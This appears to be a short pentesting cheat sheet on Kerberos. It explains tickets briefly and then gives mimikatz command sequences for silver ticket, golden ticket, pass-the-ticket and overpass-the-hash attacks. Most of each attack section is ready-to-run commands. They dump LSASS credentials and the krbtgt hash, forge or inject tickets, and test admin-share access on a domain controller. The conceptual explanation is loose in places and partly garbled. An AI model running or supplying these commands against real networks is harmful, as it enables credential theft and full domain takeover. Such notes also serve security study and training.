Related articles: 
Tags: #OS

---

When we the endpoint is domain-joined we will be able to conduct different PtH tickets including the silver ticket and gold ticket attacks aiming at Kerberos.

Kerberos is an authentication mechanism that's issuing tickets so that certain services can be accessed. 

When a request is made:

- The Authentication Server (AS) is contacted
- The AS has to verify the identity so it checks the user and password
- It then converts the password to NTLM hash and encrypts it with the timestamp and sends it to the KDC (DC).
- The DC decrypts it using the stored hash of your password.
- If successful a TGT will be granted.

---

The TGT (Ticket Granting Ticket) is like getting the access in a building, but not in a specific room.

- It is encrypted with the krbtgt hash.
- Valid for 10 hours
- Stored in memory LSASS.
- Used to request service tickets.

---

The TGS (Ticket Granting Service) happens when you exchange the TGT for a service ticket.

- It will verify the TGT and grant a TGS.


---

# Silver Ticket Attack

This type of attack will forge a TGS bypassing the TGT process. It can do so by forging one with a service account hash.

```powershell
# Getting service account hash
mimikatz "privilege::debug" "sekurlsa::logonpasswords"

# Creating silver ticket
mimikatz "kerberos::golden /domain:corp.local /sid:S-1-5-21-... /target:srv01.corp.local /service:cifs /rc4:service_account_hash /user:fake_admin /ptt"

# Testing access
dir \\srv01.corp.local\c$
```

Key Points:
- Requires service account hash
- More stealthy (no DC communication)
- Limited to specific service
- PAC validation might be enforced

---

# Golden Ticket Attack

This forges a TGT, giving complete domain access. Like having the master key to make any room key you want.

```powershell
# Dumping krbtgt hash
mimikatz "privilege::debug" "lsadump::lsa /patch"

# Creating golden ticket
mimikatz "kerberos::golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:krbtgt_hash /user:fake_admin /ptt"

# Testing domain admin access
dir \\dc01\c$
```

---

# Pass the Ticket Attack

Instead of creating new tickets, we can dump the current ones and use them:

```powershell
# Export tickets
mimikatz "sekurlsa::tickets /export"

# Inject ticket
mimikatz "kerberos::ptt ticket.kirbi"
```

---

# Overpass the Hash

Converting current NTLM hashes into Kerberos tickets:

```powershell
# Convert hash to ticket
sekurlsa::pth /user:admin /domain:corp.local /ntlm:hash /run:powershell.exe

# Request TGT
net use \\dc01
```
